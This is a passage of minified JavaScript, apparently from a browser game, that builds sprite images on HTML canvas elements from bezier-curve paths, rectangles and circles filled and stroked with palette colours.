      ye(n, t[1]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 36, e * 107);
      n.bezierCurveTo(e * 66, e * 90.5, e * 66, e * 90.5, e * 96, e * 74);
      n.bezierCurveTo(e * 93, e * 52.5, e * 93, e * 52.5, e * 90, e * 31);
      n.bezierCurveTo(e * 87, e * 48, e * 87, e * 48, e * 84, e * 65);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 1, e * 89);
      n.bezierCurveTo(e * 18, e * 100, e * 34, e * 110, e * 35, e * 111);
      n.bezierCurveTo(e * 67, e * 93, e * 67, e * 93, e * 99, e * 75);
      n.bezierCurveTo(e * 100, e * 78.5, e * 100, e * 78.5, e * 101, e * 82);
      n.bezierCurveTo(e * 68, e * 99, e * 68, e * 99, e * 35, e * 116);
      n.bezierCurveTo(e * 18, e * 106.5, e * 18, e * 106.5, e * 1, e * 97);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 36, e * 107);
      n.bezierCurveTo(e * 66.5, e * 91.5, e * 66.5, e * 91.5, e * 97, e * 76);
      n.bezierCurveTo(e * 94.5, e * 52, e * 94.5, e * 52, e * 92, e * 28);
      n.bezierCurveTo(e * 73, e * 15.5, e * 73, e * 15.5, e * 54, e * 3);
      n.bezierCurveTo(e * 33, e * 9.5, e * 33, e * 9.5, e * 12, e * 16);
      n.bezierCurveTo(e * 8, e * 53, e * 8, e * 53, e * 4, e * 90);
      n.bezierCurveTo(e * 18.5, e * 99, e * 18.5, e * 99, e * 33, e * 108);
      n.closePath();
      ye(n, undefined, t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 22, e * 71);
      n.bezierCurveTo(e * 30, e * 76.5, e * 30, e * 76.5, e * 38, e * 82);
      n.bezierCurveTo(e * 53, e * 72, e * 53, e * 72, e * 68, e * 62);
      n.bezierCurveTo(e * 68, e * 52, e * 68, e * 52, e * 68, e * 42);
      n.bezierCurveTo(e * 59.5, e * 35.5, e * 59.5, e * 35.5, e * 51, e * 29);
      n.bezierCurveTo(e * 39.5, e * 32, e * 39.5, e * 32, e * 28, e * 35);
      n.bezierCurveTo(e * 25, e * 52, e * 25, e * 52, e * 22, e * 69);
      n.closePath();
      ye(n, undefined, t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 5, e * 89);
      n.bezierCurveTo(e * 20, e * 73, e * 12.5, e * 80.5, e * 20, e * 72);
      n.closePath();
      ye(n, undefined, t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 35, e * 102);
      n.bezierCurveTo(e * 36, e * 92.5, e * 36, e * 92.5, e * 37, e * 83);
      n.closePath();
      ye(n, undefined, t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 68, e * 62);
      n.bezierCurveTo(e * 81, e * 67.5, e * 81, e * 67.5, e * 94, e * 73);
      n.closePath();
      ye(n, undefined, t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 70, e * 41);
      n.bezierCurveTo(e * 80, e * 35.5, e * 80, e * 35.5, e * 90, e * 30);
      n.closePath();
      ye(n, undefined, t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 28, e * 33);
      n.bezierCurveTo(e * 21.5, e * 26.5, e * 21.5, e * 26.5, e * 15, e * 20);
      n.closePath();
      ye(n, undefined, t[4], e * 6);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 51, e * 28);
      n.bezierCurveTo(e * 53, e * 17, e * 53, e * 17, e * 55, e * 6);
      n.closePath();
      ye(n, undefined, t[4], e * 6);
      return r;
    }
    function yr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 105;
      r.height = e * 144;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * -5, e * 0);
      n.save();
      n.translate(e * 52.5, e * 91.5);
      Be(n, e * -4.5, e * -39, e * 9, e * 78, e * 5);
      n.restore();
      ye(n, t[0], t[0], e * 3);
      n.save();
      n.translate(e * 53, e * 36);
      Be(n, e * -29, e * -17.5, e * 58, e * 35, e * 5);
      n.restore();
      ye(n, t[0], t[0], e * 4);
      n.save();
      n.translate(e * 53.5, e * 35.5);
      Be(n, e * -26.5, e * -15, e * 53, e * 30, e * 5);
      n.restore();
      ye(n, t[0], t[0], e * 4);
      n.translate(e * 5, e * 0);
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 52.5, e * 91.5);
      Be(n, e * -4.5, e * -39, e * 9, e * 78, e * 5);
      n.restore();
      ye(n, t[1], t[2], e * 3);
      n.save();
      n.translate(e * 53, e * 36);
      Be(n, e * -29, e * -17.5, e * 58, e * 35, e * 5);
      n.restore();
      ye(n, t[3], t[4], e * 4);
      n.save();
      n.translate(e * 53.5, e * 35.5);
      Be(n, e * -26.5, e * -15, e * 53, e * 30, e * 5);
      n.restore();
      ye(n, t[5], t[6], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 49, e * 60.5);
      n.bezierCurveTo(e * 44, e * 56.5, e * 44, e * 56.5, e * 39, e * 52.5);
      n.bezierCurveTo(e * 39, e * 46.5, e * 39, e * 46.5, e * 39, e * 40.5);
      n.bezierCurveTo(e * 44, e * 44, e * 44, e * 44, e * 49, e * 47.5);
      n.bezierCurveTo(e * 49, e * 54, e * 49, e * 54, e * 49, e * 60.5);
      n.closePath();
      ye(n, t[7], t[6], e * 3);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 66, e * 40.5);
      n.bezierCurveTo(e * 66, e * 46.5, e * 66, e * 46.5, e * 66, e * 52.5);
      n.bezierCurveTo(e * 60.5, e * 56.5, e * 60.5, e * 56.5, e * 55, e * 60.5);
      n.bezierCurveTo(e * 56, e * 53, e * 56, e * 53, e * 57, e * 45.5);
      n.bezierCurveTo(e * 61.5, e * 43, e * 61.5, e * 43, e * 66, e * 40.5);
      n.closePath();
      ye(n, t[7], t[6], e * 3);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 52, e * 33.5);
      n.bezierCurveTo(e * 55.5, e * 41, e * 55.5, e * 41, e * 59, e * 48.5);
      n.bezierCurveTo(e * 56, e * 58, e * 56, e * 58, e * 53, e * 67.5);
      n.bezierCurveTo(e * 49, e * 58, e * 49, e * 58, e * 45, e * 48.5);
      n.bezierCurveTo(e * 48.5, e * 41, e * 48.5, e * 41, e * 52, e * 33.5);
      n.closePath();
      ye(n, t[9], t[8], e * 3);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 52, e * 47.5);
      n.bezierCurveTo(e * 54.5, e * 50.5, e * 54.5, e * 50.5, e * 57, e * 53.5);
      n.bezierCurveTo(e * 55, e * 60, e * 55, e * 60, e * 53, e * 66.5);
      n.bezierCurveTo(e * 50.5, e * 61, e * 50.5, e * 61, e * 48, e * 55.5);
      n.bezierCurveTo(e * 50, e * 52, e * 50, e * 52, e * 52, e * 48.5);
      n.closePath();
      ye(n, t[11], t[10], e * 3);
      return r;
    }
    function Br(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 46;
      r.height = e * 140;
      n.scale(e * -1, e * 1);
      n.translate(e * -50, e * 40);
      n.translate(e * -20, 0);
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 10, 0);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 22.599990844726562, e * 85.94999694824219);
      n.bezierCurveTo(e * 17.599990844726562, e * 83.94999694824219, e * 17.599990844726562, e * 83.94999694824219, e * 12.599990844726562, e * 81.94999694824219);
      n.bezierCurveTo(e * 19.599990844726562, e * 73.94999694824219, e * 2.5999908447265625, e * 22.949996948242188, e * 33.59999084472656, e * 7.9499969482421875);
      n.bezierCurveTo(e * 27.599990844726562, e * 28.949996948242188, e * 33.59999084472656, e * 26.949996948242188, e * 35.59999084472656, e * 32.94999694824219);
      n.bezierCurveTo(e * 25.599990844726562, e * 59.94999694824219, e * 26.599990844726562, e * 69.94999694824219, e * 29.599990844726562, e * 82.94999694824219);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.translate(e * -1, 0);
      n.moveTo(e * 17.599990844726562, e * 89.75);
      n.bezierCurveTo(e * 24.599990844726562, e * 99.75, e * 24.599990844726562, e * 101.75, e * 20.599990844726562, e * 111.75);
      n.bezierCurveTo(e * 28.599990844726562, e * 110.75, e * 26.599990844726562, e * 112.75, e * 28.599990844726562, e * 111.75);
      n.bezierCurveTo(e * 30.599990844726562, e * 96.75, e * 32.59999084472656, e * 96.75, e * 30.599990844726562, e * 87.75);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.translate(e * 1, 0);
      n.moveTo(e * 7.5999908447265625, e * 86.34999084472656);
      n.bezierCurveTo(e * 12.599990844726562, e * 85.34999084472656, e * 14.599990844726562, e * 84.34999084472656, e * 13.599990844726562, e * 84.34999084472656);
      n.bezierCurveTo(e * 21.599990844726562, e * 83.34999084472656, e * 21.599990844726562, e * 83.34999084472656, e * 29.599990844726562, e * 82.34999084472656);
      n.bezierCurveTo(e * 33.59999084472656, e * 85.84999084472656, e * 33.59999084472656, e * 85.84999084472656, e * 37.59999084472656, e * 89.34999084472656);
      n.bezierCurveTo(e * 34.09999084472656, e * 91.84999084472656, e * 34.09999084472656, e * 91.84999084472656, e * 30.599990844726562, e * 94.34999084472656);
      n.bezierCurveTo(e * 21.099990844726562, e * 93.34999084472656, e * 21.099990844726562, e * 93.34999084472656, e * 11.599990844726562, e * 92.34999084472656);
      n.closePath();
      ye(n, t[0]);
      n.save();
      n.translate(e * 23.599990844726562, e * 110.94999694824219);
      n.rotate(0);
      Be(n, e * -7, e * -4, e * 14, e * 8, e * 10);
      n.restore();
      ye(n, t[0]);
      n.translate(e * 0, 0);
      n.globalAlpha = 1;
      n.translate(e * 10, 0);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 22.599990844726562, e * 85.94999694824219);
      n.bezierCurveTo(e * 17.599990844726562, e * 83.94999694824219, e * 17.599990844726562, e * 83.94999694824219, e * 12.599990844726562, e * 81.94999694824219);
      n.bezierCurveTo(e * 19.599990844726562, e * 73.94999694824219, e * 2.5999908447265625, e * 22.949996948242188, e * 33.59999084472656, e * 7.9499969482421875);
      n.bezierCurveTo(e * 27.599990844726562, e * 28.949996948242188, e * 33.59999084472656, e * 26.949996948242188, e * 35.59999084472656, e * 32.94999694824219);
      n.bezierCurveTo(e * 25.599990844726562, e * 59.94999694824219, e * 26.599990844726562, e * 69.94999694824219, e * 29.599990844726562, e * 82.94999694824219);
      n.closePath();
      ye(n, t[3], t[4], e * 3);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.translate(e * -1, 0);
      n.moveTo(e * 17.599990844726562, e * 89.75);
      n.bezierCurveTo(e * 24.599990844726562, e * 99.75, e * 24.599990844726562, e * 101.75, e * 20.599990844726562, e * 111.75);
      n.bezierCurveTo(e * 28.599990844726562, e * 110.75, e * 26.599990844726562, e * 112.75, e * 28.599990844726562, e * 111.75);
      n.bezierCurveTo(e * 30.599990844726562, e * 96.75, e * 32.59999084472656, e * 96.75, e * 30.599990844726562, e * 87.75);
      n.closePath();
      ye(n, t[1], t[2], e * 3);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.translate(e * 1, 0);
      n.moveTo(e * 7.5999908447265625, e * 86.34999084472656);
      n.bezierCurveTo(e * 12.599990844726562, e * 85.34999084472656, e * 14.599990844726562, e * 84.34999084472656, e * 13.599990844726562, e * 84.34999084472656);
      n.bezierCurveTo(e * 21.599990844726562, e * 83.34999084472656, e * 21.599990844726562, e * 83.34999084472656, e * 29.599990844726562, e * 82.34999084472656);
      n.bezierCurveTo(e * 33.59999084472656, e * 85.84999084472656, e * 33.59999084472656, e * 85.84999084472656, e * 37.59999084472656, e * 89.34999084472656);
      n.bezierCurveTo(e * 34.09999084472656, e * 91.84999084472656, e * 34.09999084472656, e * 91.84999084472656, e * 30.599990844726562, e * 94.34999084472656);
      n.bezierCurveTo(e * 21.099990844726562, e * 93.34999084472656, e * 21.099990844726562, e * 93.34999084472656, e * 11.599990844726562, e * 92.34999084472656);
      n.closePath();
      ye(n, t[1], t[2], e * 3);
      n.save();
      n.translate(e * 23.599990844726562, e * 110.94999694824219);
      n.rotate(0);
      Be(n, e * -7, e * -4, e * 14, e * 8, e * 10);
      n.restore();
      ye(n, t[1], t[2], e * 3);
      return r;
    }
    function zr(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      var n = e * 120;
      var a = e * 140;
      t.width = n;
      t.height = a;
      t.width = e * 130;
      t.height = e * 120;
      Be(r, e * 10, e * 12, e * 110, e * 90, e * 10);
      ye(r, i[0]);
      Be(r, e * 10, e * 5, e * 110, e * 90, e * 10);
      ye(r, i[1], i[2], e * 4);
      var o = we(-Math.PI / 5, Hi(e * 0.5, true, ["rgba(255, 255, 255, 0)", "rgba(255, 255, 255, 0)", "rgba(255, 255, 255, 0)", "#FFF", "#FFF", "#FFF", "#FFF"]));
      r.drawImage(o, e * 12, e * 18);
      o = we(Math.PI / 4, Ft(e * 0.55, true, ["rgba(255, 255, 255, 0)", "#FFF", "#FFF", "#FFF", "#FFF"]));
      r.drawImage(o, e * 36, e * 16);
      return t;
    }
    function Wr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 137;
      r.height = e * 129;
      n.globalAlpha = 0.5;
      ze(n, e * 69, e * 64, e * 48.16637831516918);
      ye(n, t[1]);
      n.globalAlpha = 0.7;
      ze(n, e * 69, e * 64, e * 38.23105625617661);
      ye(n, t[2]);
      n.globalAlpha = 0.7;
      ze(n, e * 69, e * 64, e * 32.01562118716424);
      ye(n, t[2], t[3], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 72, e * 41);
      n.bezierCurveTo(e * 52, e * 41, e * 48, e * 50, e * 45, e * 58);
      n.bezierCurveTo(e * 43, e * 67, e * 45, e * 68, e * 46, e * 72);
      n.bezierCurveTo(e * 52, e * 53, e * 60, e * 48, e * 72, e * 42);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 93, e * 62);
      n.bezierCurveTo(e * 95, e * 72, e * 90, e * 81, e * 81, e * 87);
      n.bezierCurveTo(e * 74, e * 91, e * 69, e * 89, e * 64, e * 88);
      n.bezierCurveTo(e * 77, e * 83, e * 84, e * 82, e * 92, e * 62);
      n.closePath();
      ye(n, t[3]);
      return r;
    }
    function Vr(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 137;
      r.height = e * 129;
      n.globalAlpha = 0.4;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 42.000030517578125, e * 41.17047119140625);
      n.bezierCurveTo(e * 45.000030517578125, e * 38.17047119140625, e * 49.000030517578125, e * 37.17047119140625, e * 62.000030517578125, e * 38.17047119140625);
      n.bezierCurveTo(e * 78.00003051757812, e * 38.17047119140625, e * 78.00003051757812, e * 38.17047119140625, e * 94.00003051757812, e * 38.17047119140625);
      n.bezierCurveTo(e * 100.00003051757812, e * 38.17047119140625, e * 102.00003051757812, e * 38.17047119140625, e * 101.00003051757812, e * 47.17047119140625);
      n.bezierCurveTo(e * 101.00003051757812, e * 63.67047119140625, e * 101.00003051757812, e * 63.67047119140625, e * 101.00003051757812, e * 80.17047119140625);
      n.bezierCurveTo(e * 102.00003051757812, e * 84.17047119140625, e * 100.00003051757812, e * 86.17047119140625, e * 95.00003051757812, e * 88.17047119140625);
      n.bezierCurveTo(e * 84.00003051757812, e * 94.17047119140625, e * 89.00003051757812, e * 94.17047119140625, e * 79.00003051757812, e * 94.17047119140625);
      n.bezierCurveTo(e * 59.500030517578125, e * 94.17047119140625, e * 59.500030517578125, e * 94.17047119140625, e * 40.000030517578125, e * 94.17047119140625);
      n.bezierCurveTo(e * 33.000030517578125, e * 94.17047119140625, e * 34.000030517578125, e * 94.17047119140625, e * 34.000030517578125, e * 86.17047119140625);
      n.bezierCurveTo(e * 34.000030517578125, e * 69.67047119140625, e * 34.000030517578125, e * 69.67047119140625, e * 34.000030517578125, e * 53.17047119140625);
      n.bezierCurveTo(e * 33.000030517578125, e * 47.17047119140625, e * 34.000030517578125, e * 47.17047119140625, e * 40.000030517578125, e * 42.17047119140625);
      n.closePath();
      ye(n, undefined, t[2], e * 40);
      n.globalAlpha = 0.4;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 42.000030517578125, e * 41.17047119140625);
      n.bezierCurveTo(e * 45.000030517578125, e * 38.17047119140625, e * 49.000030517578125, e * 37.17047119140625, e * 62.000030517578125, e * 38.17047119140625);
      n.bezierCurveTo(e * 78.00003051757812, e * 38.17047119140625, e * 78.00003051757812, e * 38.17047119140625, e * 94.00003051757812, e * 38.17047119140625);
      n.bezierCurveTo(e * 100.00003051757812, e * 38.17047119140625, e * 102.00003051757812, e * 38.17047119140625, e * 101.00003051757812, e * 47.17047119140625);
      n.bezierCurveTo(e * 101.00003051757812, e * 63.67047119140625, e * 101.00003051757812, e * 63.67047119140625, e * 101.00003051757812, e * 80.17047119140625);
      n.bezierCurveTo(e * 102.00003051757812, e * 84.17047119140625, e * 100.00003051757812, e * 86.17047119140625, e * 95.00003051757812, e * 88.17047119140625);
      n.bezierCurveTo(e * 84.00003051757812, e * 94.17047119140625, e * 89.00003051757812, e * 94.17047119140625, e * 79.00003051757812, e * 94.17047119140625);
      n.bezierCurveTo(e * 59.500030517578125, e * 94.17047119140625, e * 59.500030517578125, e * 94.17047119140625, e * 40.000030517578125, e * 94.17047119140625);
      n.bezierCurveTo(e * 33.000030517578125, e * 94.17047119140625, e * 34.000030517578125, e * 94.17047119140625, e * 34.000030517578125, e * 86.17047119140625);
      n.bezierCurveTo(e * 34.000030517578125, e * 69.67047119140625, e * 34.000030517578125, e * 69.67047119140625, e * 34.000030517578125, e * 53.17047119140625);
      n.bezierCurveTo(e * 33.000030517578125, e * 47.17047119140625, e * 34.000030517578125, e * 47.17047119140625, e * 40.000030517578125, e * 42.17047119140625);
      n.closePath();
      ye(n, undefined, t[1], e * 20);
      n.globalAlpha = 0.8;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 42.000030517578125, e * 41.17047119140625);
      n.bezierCurveTo(e * 45.000030517578125, e * 38.17047119140625, e * 49.000030517578125, e * 37.17047119140625, e * 62.000030517578125, e * 38.17047119140625);
      n.bezierCurveTo(e * 78.00003051757812, e * 38.17047119140625, e * 78.00003051757812, e * 38.17047119140625, e * 94.00003051757812, e * 38.17047119140625);
      n.bezierCurveTo(e * 100.00003051757812, e * 38.17047119140625, e * 102.00003051757812, e * 38.17047119140625, e * 101.00003051757812, e * 47.17047119140625);
      n.bezierCurveTo(e * 101.00003051757812, e * 63.67047119140625, e * 101.00003051757812, e * 63.67047119140625, e * 101.00003051757812, e * 80.17047119140625);
      n.bezierCurveTo(e * 102.00003051757812, e * 84.17047119140625, e * 100.00003051757812, e * 86.17047119140625, e * 95.00003051757812, e * 88.17047119140625);
      n.bezierCurveTo(e * 84.00003051757812, e * 94.17047119140625, e * 89.00003051757812, e * 94.17047119140625, e * 79.00003051757812, e * 94.17047119140625);
      n.bezierCurveTo(e * 59.500030517578125, e * 94.17047119140625, e * 59.500030517578125, e * 94.17047119140625, e * 40.000030517578125, e * 94.17047119140625);
      n.bezierCurveTo(e * 33.000030517578125, e * 94.17047119140625, e * 34.000030517578125, e * 94.17047119140625, e * 34.000030517578125, e * 86.17047119140625);
      n.bezierCurveTo(e * 34.000030517578125, e * 69.67047119140625, e * 34.000030517578125, e * 69.67047119140625, e * 34.000030517578125, e * 53.17047119140625);
      n.bezierCurveTo(e * 33.000030517578125, e * 47.17047119140625, e * 34.000030517578125, e * 47.17047119140625, e * 40.000030517578125, e * 42.17047119140625);
      n.closePath();
      ye(n, t[0], t[1], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 51.000030517578125, e * 37.9886474609375);
      n.bezierCurveTo(e * 51.000030517578125, e * 61.9886474609375, e * 51.000030517578125, e * 61.9886474609375, e * 51.000030517578125, e * 85.9886474609375);
      n.bezierCurveTo(e * 75.50003051757812, e * 85.9886474609375, e * 75.50003051757812, e * 85.9886474609375, e * 100.00003051757812, e * 85.9886474609375);
      n.bezierCurveTo(e * 100.00003051757812, e * 61.9886474609375, e * 100.00003051757812, e * 61.9886474609375, e * 100.00003051757812, e * 37.9886474609375);
      n.bezierCurveTo(e * 76.00003051757812, e * 37.9886474609375, e * 76.00003051757812, e * 37.9886474609375, e * 52.000030517578125, e * 37.9886474609375);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 99.00003051757812, e * 38.9886474609375);
      n.bezierCurveTo(e * 93.50003051757812, e * 44.9886474609375, e * 93.50003051757812, e * 44.9886474609375, e * 88.00003051757812, e * 50.9886474609375);
      n.bezierCurveTo(e * 88.00003051757812, e * 72.4886474609375, e * 88.00003051757812, e * 72.4886474609375, e * 88.00003051757812, e * 93.9886474609375);
      n.bezierCurveTo(e * 94.00003051757812, e * 90.4886474609375, e * 94.00003051757812, e * 90.4886474609375, e * 100.00003051757812, e * 86.9886474609375);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 87.00003051757812, e * 49.625);
      n.bezierCurveTo(e * 61.000030517578125, e * 49.625, e * 61.000030517578125, e * 49.625, e * 35.000030517578125, e * 49.625);
      n.bezierCurveTo(e * 35.000030517578125, e * 70.625, e * 35.000030517578125, e * 70.625, e * 35.000030517578125, e * 91.625);
      n.bezierCurveTo(e * 60.500030517578125, e * 91.625, e * 60.500030517578125, e * 91.625, e * 86.00003051757812, e * 91.625);
      n.bezierCurveTo(e * 86.50003051757812, e * 70.625, e * 86.50003051757812, e * 70.625, e * 87.00003051757812, e * 49.625);
      n.closePath();
      ye(n, t[1], t[3], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 47.000030517578125, e * 36.625);
      n.bezierCurveTo(e * 73.00003051757812, e * 37.125, e * 73.00003051757812, e * 37.125, e * 99.00003051757812, e * 37.625);
      n.bezierCurveTo(e * 93.50003051757812, e * 44.125, e * 93.50003051757812, e * 44.125, e * 88.00003051757812, e * 50.625);
      n.bezierCurveTo(e * 60.500030517578125, e * 50.125, e * 60.500030517578125, e * 50.125, e * 33.000030517578125, e * 49.625);
      n.closePath();
      ye(n, t[1], t[3], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 53.000030517578125, e * 52.625);
      n.bezierCurveTo(e * 40.000030517578125, e * 54.625, e * 39.000030517578125, e * 59.625, e * 40.000030517578125, e * 67.625);
      n.bezierCurveTo(e * 45.000030517578125, e * 59.625, e * 48.000030517578125, e * 58.625, e * 54.000030517578125, e * 53.625);
      n.closePath();
      ye(n, t[3]);
      n.globalAlpha = 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 42.000030517578125, e * 41.17047119140625);
      n.bezierCurveTo(e * 45.000030517578125, e * 38.17047119140625, e * 49.000030517578125, e * 37.17047119140625, e * 62.000030517578125, e * 38.17047119140625);
      n.bezierCurveTo(e * 78.00003051757812, e * 38.17047119140625, e * 78.00003051757812, e * 38.17047119140625, e * 94.00003051757812, e * 38.17047119140625);
      n.bezierCurveTo(e * 100.00003051757812, e * 38.17047119140625, e * 102.00003051757812, e * 38.17047119140625, e * 101.00003051757812, e * 47.17047119140625);
      n.bezierCurveTo(e * 101.00003051757812, e * 63.67047119140625, e * 101.00003051757812, e * 63.67047119140625, e * 101.00003051757812, e * 80.17047119140625);
      n.bezierCurveTo(e * 102.00003051757812, e * 84.17047119140625, e * 100.00003051757812, e * 86.17047119140625, e * 95.00003051757812, e * 88.17047119140625);
      n.bezierCurveTo(e * 84.00003051757812, e * 94.17047119140625, e * 89.00003051757812, e * 94.17047119140625, e * 79.00003051757812, e * 94.17047119140625);
      n.bezierCurveTo(e * 59.500030517578125, e * 94.17047119140625, e * 59.500030517578125, e * 94.17047119140625, e * 40.000030517578125, e * 94.17047119140625);
      n.bezierCurveTo(e * 33.000030517578125, e * 94.17047119140625, e * 34.000030517578125, e * 94.17047119140625, e * 34.000030517578125, e * 86.17047119140625);
      n.bezierCurveTo(e * 34.000030517578125, e * 69.67047119140625, e * 34.000030517578125, e * 69.67047119140625, e * 34.000030517578125, e * 53.17047119140625);
      n.bezierCurveTo(e * 33.000030517578125, e * 47.17047119140625, e * 34.000030517578125, e * 47.17047119140625, e * 40.000030517578125, e * 42.17047119140625);
      n.closePath();
      ye(n, undefined, t[3], e * 4);
      return r;
    }
    function wr(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 376;
      t.height = e * 371;
      r.globalAlpha = 0.5;
      r.translate(e * 5, e * 5);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 191.633544921875, e * 123.98580932617188);
      r.bezierCurveTo(e * 215.633544921875, e * 85.98580932617188, e * 187.633544921875, e * 71.98580932617188, e * 202.633544921875, e * 19.985809326171875);
      r.bezierCurveTo(e * 231.633544921875, e * 68.98580932617188, e * 253.633544921875, e * 71.98580932617188, e * 256.633544921875, e * 93.98580932617188);
      r.bezierCurveTo(e * 306.633544921875, e * 64.98580932617188, e * 319.633544921875, e * 61.985809326171875, e * 350.633544921875, e * 58.985809326171875);
      r.bezierCurveTo(e * 280.633544921875, e * 86.98580932617188, e * 281.633544921875, e * 106.98580932617188, e * 268.633544921875, e * 130.98580932617188);
      r.bezierCurveTo(e * 295.633544921875, e * 158.98580932617188, e * 328.633544921875, e * 155.98580932617188, e * 353.633544921875, e * 90.98580932617188);
      r.bezierCurveTo(e * 371.633544921875, e * 158.98580932617188, e * 337.633544921875, e * 210.98580932617188, e * 286.633544921875, e * 209.98580932617188);
      r.bezierCurveTo(e * 323.633544921875, e * 230.98580932617188, e * 317.633544921875, e * 274.9858093261719, e * 356.633544921875, e * 305.9858093261719);
      r.bezierCurveTo(e * 288.633544921875, e * 297.9858093261719, e * 288.633544921875, e * 265.9858093261719, e * 275.633544921875, e * 266.9858093261719);
      r.bezierCurveTo(e * 280.633544921875, e * 294.9858093261719, e * 315.633544921875, e * 306.9858093261719, e * 336.633544921875, e * 316.9858093261719);
      r.bezierCurveTo(e * 295.633544921875, e * 318.9858093261719, e * 264.633544921875, e * 302.9858093261719, e * 254.633544921875, e * 289.9858093261719);
      r.bezierCurveTo(e * 252.633544921875, e * 301.9858093261719, e * 224.633544921875, e * 315.9858093261719, e * 201.633544921875, e * 356.9858093261719);
      r.bezierCurveTo(e * 195.633544921875, e * 313.9858093261719, e * 195.633544921875, e * 308.9858093261719, e * 196.633544921875, e * 307.9858093261719);
      r.bezierCurveTo(e * 197.633544921875, e * 289.9858093261719, e * 207.633544921875, e * 283.9858093261719, e * 195.633544921875, e * 258.9858093261719);
      r.bezierCurveTo(e * 182.633544921875, e * 282.9858093261719, e * 190.633544921875, e * 287.9858093261719, e * 193.633544921875, e * 297.9858093261719);
      r.bezierCurveTo(e * 195.633544921875, e * 306.9858093261719, e * 191.633544921875, e * 334.9858093261719, e * 187.633544921875, e * 354.9858093261719);
      r.bezierCurveTo(e * 165.633544921875, e * 320.9858093261719, e * 138.633544921875, e * 307.9858093261719, e * 135.633544921875, e * 288.9858093261719);
      r.bezierCurveTo(e * 110.633544921875, e * 318.9858093261719, e * 68.633544921875, e * 323.9858093261719, e * 49.633544921875, e * 320.9858093261719);
      r.bezierCurveTo(e * 88.633544921875, e * 308.9858093261719, e * 108.633544921875, e * 284.9858093261719, e * 118.633544921875, e * 258.9858093261719);
      r.bezierCurveTo(e * 86.633544921875, e * 264.9858093261719, e * 75.633544921875, e * 310.9858093261719, e * 19.633544921875, e * 304.9858093261719);
      r.bezierCurveTo(e * 54.633544921875, e * 276.9858093261719, e * 59.633544921875, e * 214.98580932617188, e * 105.633544921875, e * 205.98580932617188);
      r.bezierCurveTo(e * 14.633544921875, e * 201.98580932617188, e * 24.633544921875, e * 141.98580932617188, e * 25.633544921875, e * 82.98580932617188);
      r.bezierCurveTo(e * 49.633544921875, e * 168.98580932617188, e * 87.633544921875, e * 141.98580932617188, e * 112.633544921875, e * 123.98580932617188);
      r.bezierCurveTo(e * 95.633544921875, e * 75.98580932617188, e * 70.633544921875, e * 68.98580932617188, e * 35.633544921875, e * 50.985809326171875);
      r.bezierCurveTo(e * 70.633544921875, e * 53.985809326171875, e * 102.633544921875, e * 65.98580932617188, e * 125.633544921875, e * 84.98580932617188);
      r.bezierCurveTo(e * 133.633544921875, e * 69.98580932617188, e * 166.633544921875, e * 42.985809326171875, e * 176.633544921875, e * 21.985809326171875);
